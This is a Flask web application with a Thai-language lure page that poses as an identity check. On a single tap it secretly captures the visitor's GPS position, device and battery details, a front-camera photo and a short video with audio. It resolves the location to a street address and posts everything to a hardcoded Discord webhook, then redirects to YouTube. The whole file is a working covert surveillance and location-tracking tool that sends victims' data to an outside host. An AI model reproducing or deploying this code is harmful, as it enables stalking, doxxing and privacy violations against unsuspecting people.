from flask import Flask, request
import requests
import base64
import json
from datetime import datetime

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"

def get_location_from_ip(ip):
    try:
        url = f'https://ipinfo.io/{ip}/json'
        resp = requests.get(url, timeout=5)
        data = resp.json()
        if data.get('ip'):
            loc = data.get('loc', '').split(',')
            return {
                'city': data.get('city', 'ไม่ระบุ'),
                'region': data.get('region', 'ไม่ระบุ'),
                'country': data.get('country', 'ไม่ระบุ'),
                'isp': data.get('org', 'ไม่ระบุ'),
                'lat': float(loc[0]) if len(loc) > 0 else 0,
                'lon': float(loc[1]) if len(loc) > 1 else 0
            }
    except Exception as e:
        print(f"IPInfo error: {e}")
    return None

def reverse_geocode(lat, lon):
    try:
        url = f'https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&accept-language=th'
        headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
        resp = requests.get(url, headers=headers, timeout=10)
        data = resp.json()
        if 'address' in data:
            addr = data['address']
            return {
                'road': addr.get('road', addr.get('pedestrian', '')),
                'suburb': addr.get('suburb', addr.get('neighbourhood', '')),
                'village': addr.get('village', addr.get('town', '')),
                'city': addr.get('city', addr.get('town', addr.get('village', ''))),
                'district': addr.get('state_district', ''),
                'province': addr.get('province', addr.get('state', '')),
                'postcode': addr.get('postcode', ''),
                'country': addr.get('country', ''),
                'display_name': data.get('display_name', '')
            }
    except Exception as e:
        print(f"Geocode error: {e}")
    return None

HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>แตะเพื่อดำเนินการ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea, #764ba2);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            font-family: 'Segoe UI', sans-serif;
        }
        .container { text-align: center; color: white; padding: 20px; }
        h1 { font-size: 1.8rem; margin: 20px 0; }
        .spinner {
            width: 45px; height: 45px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .info-text { font-size: 0.9rem; opacity: 0.8; margin-top: 10px; }
    </style>
</head>
<body onclick="startCapture()">
    <div class="container" id="ui">
        <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
        <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
        <div class="info-text">ใช้เวลาประมาณ 5-6 วินาที</div>
    </div>
    <script>
        async function startCapture() {
            document.body.onclick = null;
            document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
            
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                vendor: navigator.vendor,
                screenWidth: screen.width,
                screenHeight: screen.height,
                pixelRatio: window.devicePixelRatio || 1,
                timestamp: new Date().toISOString()
            };
            
            // ขอ GPS
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                });
                deviceInfo.gps_lat = pos.coords.latitude;
                deviceInfo.gps_lon = pos.coords.longitude;
                deviceInfo.gps_accuracy = pos.coords.accuracy;
            } catch(e) {
                deviceInfo.gps = 'ไม่ได้รับอนุญาตหรือไม่รองรับ';
            }
            
            // แบตเตอรี่
            try {
                const battery = await navigator.getBattery();
                deviceInfo.batteryLevel = Math.round(battery.level * 100);
                deviceInfo.batteryCharging = battery.charging;
            } catch(e) {
                deviceInfo.batteryLevel = 'ไม่รองรับ';
            }
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: true 
                });
                
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
                const chunks = [];
                recorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 3000));
                recorder.stop();
                await new Promise(r => recorder.onstop = r);
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                
                stream.getTracks().forEach(t => t.stop());
                video.remove();
                
                const formData = new FormData();
                formData.append('photo', photoBlob, 'photo.jpg');
                formData.append('video', videoBlob, 'video.webm');
                formData.append('info', JSON.stringify(deviceInfo));
                
                await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
            } catch(error) {
                console.error('Error:', error);
                const formData = new FormData();
                formData.append('info', JSON.stringify(deviceInfo));
                await fetch('/upload', { method: 'POST', body: formData });
            }
            
            window.location.href = "https://www.youtube.com/watch?v=I8o8IOXAeFQ";
        }
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML

@app.route('/upload', methods=['POST'])
def upload():
    try:
        ip = request.remote_addr
        forwarded = request.headers.get('X-Forwarded-For')
        real_ip = forwarded.split(',')[0].strip() if forwarded else ip
        
        info_str = request.form.get('info', '{}')
        try:
            device_info = json.loads(info_str)
        except:
            device_info = {}
        
        photo = request.files.get('photo')
        video = request.files.get('video')
        
        location = get_location_from_ip(real_ip)
        
        # แปลง GPS เป็นที่อยู่
        gps_address = None
        if device_info.get('gps_lat') and device_info.get('gps_lon'):
            gps_address = reverse_geocode(device_info['gps_lat'], device_info['gps_lon'])
        
        time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        content = f"**📱 ข้อมูลการเชื่อมต่อ**\n"
        content += f"🌐 IP: {real_ip}\n"
        if location:
            content += f"📍 เมือง (IP): {location['city']}\n"
            content += f"🗺️ จังหวัด (IP): {location['region']}\n"
            content += f"🌍 ประเทศ (IP): {location['country']}\n"
            content += f"📶 ค่ายเน็ต/ISP: {location['isp']}\n"
            content += f"🗺️ พิกัด IP: {location['lat']}, {location['lon']}\n"
        
        # GPS + ที่อยู่จาก GPS
        if device_info.get('gps_lat') and device_info.get('gps_lon'):
            content += f"📍 GPS: {device_info['gps_lat']}, {device_info['gps_lon']}\n"
            if device_info.get('gps_accuracy'):
                content += f"🎯 ความแม่นยำ GPS: ±{device_info['gps_accuracy']} เมตร\n"
            if gps_address:
                content += f"🏠 ที่อยู่ (GPS): {gps_address.get('display_name', 'ไม่พบที่อยู่')}\n"
                if gps_address.get('road'):
                    content += f"🛣️ ถนน: {gps_address['road']}\n"
                if gps_address.get('village'):
                    content += f"🏘️ ตำบล/หมู่บ้าน: {gps_address['village']}\n"
                if gps_address.get('city'):
                    content += f"🏙️ อำเภอ/เมือง: {gps_address['city']}\n"
                if gps_address.get('province'):
                    content += f"🗺️ จังหวัด: {gps_address['province']}\n"
                if gps_address.get('postcode'):
                    content += f"📮 รหัสไปรษณีย์: {gps_address['postcode']}\n"
        elif device_info.get('gps') == 'ไม่ได้รับอนุญาตหรือไม่รองรับ':
            content += f"📍 GPS: ปฏิเสธหรือไม่รองรับ\n"
        
        content += f"📱 UA: {device_info.get('userAgent', 'ไม่ระบุ')[:100]}\n"
        content += f"💻 แพลตฟอร์ม: {device_info.get('platform', 'ไม่ระบุ')}\n"
        content += f"🖥️ หน้าจอ: {device_info.get('screenWidth')}x{device_info.get('screenHeight')}\n"
        content += f"🔤 ภาษา: {device_info.get('language', 'ไม่ระบุ')}\n"
        content += f"🔋 แบตเตอรี่: {device_info.get('batteryLevel', 'ไม่ระบุ')}%"
        if device_info.get('batteryCharging') is True:
            content += " (กำลังชาร์จ)"
        elif device_info.get('batteryCharging') is False:
            content += " (ไม่กำลังชาร์จ)"
        content += f"\n🕐 เวลา: {time_now}\n"
        
        payload = {"username": "Security", "content": content}
        files = {}
        
        if photo:
            photo.seek(0)
            files['file1'] = ('photo.jpg', photo.read(), 'image/jpeg')
        
        if video:
            video.seek(0)
            files['file2'] = ('video.webm', video.read(), 'video/webm')
        
        if files:
            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        else:
            requests.post(DISCORD_WEBHOOK_URL, data=payload)
        
        return "OK", 200
        
    except Exception as e:
        print(f"Error: {e}")
        return "Error", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
